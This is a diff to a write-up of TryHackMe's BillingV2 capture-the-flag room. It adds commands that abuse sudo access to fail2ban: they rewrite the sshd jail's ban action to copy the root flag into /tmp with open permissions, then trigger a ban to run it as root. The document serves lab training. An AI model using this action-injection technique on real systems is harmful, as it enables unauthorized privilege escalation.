@@ -1,4 +1,4 @@
-# BillingV2 CTF
+# Tryhackme's BillingV2 CTF
 
 ## Category: Easy
 
@@ -27,8 +27,12 @@
     - Misused `actionban`, but realized correct syntax was `action`
     - Overwrote a rule to execute:
       ```bash
-      cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt
+       sudo /usr/bin/fail2ban set sshd action iptables-multiport actionban "cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt"
       ````
+    - To trigger the fail2ban:
+      ```bash
+    	sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.2
+      ```
     - Restarted Fail2Ban service - **Successfully escalated to root**
 - Captured **root.txt**
 
